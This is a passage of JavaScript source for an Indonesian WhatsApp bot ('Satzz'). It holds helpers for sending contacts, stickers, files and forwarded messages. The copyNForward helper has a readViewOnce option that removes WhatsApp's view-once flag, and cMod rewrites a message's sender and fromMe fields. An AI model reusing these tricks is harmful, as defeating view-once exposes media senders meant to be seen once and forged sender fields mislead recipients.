item5.X-ABLabel:bot ini di dengan tangan yang belum pernah kau genggam. -Satzz
END:VCARD`.trim()
contacts.push({ contextInfo,vcard, displayName: name })

}
return await Satzz.sendMessage(jid, {
contacts: {
displayName: (contacts.length > 1 ? `2013 kontak` : contacts[0].displayName) || null,
contacts,
}
},
{
quoted,
...options
})
}





Satzz.sendImageAsSticker = async (jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
buffer = await writeExifImg(buff, options)
} else {
buffer = await imageToWebp(buff)}
await Satzz.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted })
return buffer
}





Satzz.sendSticker = (teks) => {
Satzz.sendMessage(m.chat, {sticker: {url: teks}},{quoted: m})
}
 





Satzz.sendVideoAsSticker = async (jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
buffer = await writeExifVid(buff, options)
} else {
buffer = await videoToWebp(buff)}
await Satzz.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted })
return buffer}






 Satzz.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
let quoted = message.msg ? message.msg : message
let mime = (message.msg || message).mimetype || ''
let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
const stream = await downloadContentFromMessage(quoted, messageType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])}
let type = await FileType.fromBuffer(buffer)
trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
await fs.writeFileSync(trueFileName, buffer)
return trueFileName
 }

 
 
 
 
 
Satzz.cMod = (jid, copy, text = '', sender = Satzz.user.id, options = {}) => {
let mtype = Object.keys(copy.message)[0]
let isEphemeral = mtype === 'ephemeralMessage'
if (isEphemeral) {
mtype = Object.keys(copy.message.ephemeralMessage.message)[0]}
let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
let content = msg[mtype]
if (typeof content === 'string') msg[mtype] = text || content
else if (content.caption) content.caption = text || content.caption
else if (content.text) content.text = text || content.text
if (typeof content !== 'string') msg[mtype] = {
...content,
...options}
if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
copy.key.remoteJid = jid
copy.key.fromMe = sender === Satzz.user.id
return proto.WebMessageInfo.fromObject(copy)}
Satzz.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
let types = await Satzz.getFile(PATH, true)
let { filename, size, ext, mime, data } = types
let type = '', mimetype = mime, pathFile = filename
if (options.asDocument) type = 'document'
if (options.asSticker || /webp/.test(mime)) {
let { writeExif } = require('./lib/sticker.js')
let media = { mimetype: mime, data }
pathFile = await writeExif(media, { packname: global.packname, author: global.packname2, categories: options.categories ? options.categories : [] })
await fs.promises.unlink(filename)
type = 'sticker'
mimetype = 'image/webp'}
else if (/image/.test(mime)) type = 'image'
else if (/video/.test(mime)) type = 'video'
else if (/audio/.test(mime)) type = 'audio'
else type = 'document'
await Satzz.sendMessage(jid, { [type]: { url: pathFile }, mimetype, fileName, ...options }, { quoted, ...options })
return fs.promises.unlink(pathFile)}
Satzz.parseMention = async(text) => {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')}






Satzz.copyNForward = async (jid, message, forceForward = false, options = {}) => {
let vtype
if (options.readViewOnce) {
message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
vtype = Object.keys(message.message.viewOnceMessage.message)[0]
delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
delete message.message.viewOnceMessage.message[vtype].viewOnce
message.message = {
...message.message.viewOnceMessage.message}}
let mtype = Object.keys(message.message)[0]
let content = await generateForwardMessageContent(message, forceForward)
let ctype = Object.keys(content)[0]
let context = {}
if (mtype != "conversation") context = message.message[mtype].contextInfo
content[ctype].contextInfo = {
...context,
...content[ctype].contextInfo}
const waMessage = await generateWAMessageFromContent(jid, content, options ? {
...content[ctype],
...options,
...(options.contextInfo ? {
contextInfo: {
...content[ctype].contextInfo,
...options.contextInfo}} : {})} : {})
await Satzz.relayMessage(jid, waMessage.message, { messageId:  waMessage.key.id })
return waMessage}






Satzz.getFile = async (PATH, save) => {
let res
let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split`,`[1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
let type = await FileType.fromBuffer(data) || {
mime: 'application/octet-stream',
ext: '.bin'
}
filename = path.join(__filename, '../src/' + new Date * 1 + '.' + type.ext)
if (data && save) fs.promises.writeFile(filename, data)
return {
res,
filename,
	size: await getSizeMedia(data),
...type,
data
}
}
    


return Satzz
}

connectToWhatsApp()

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
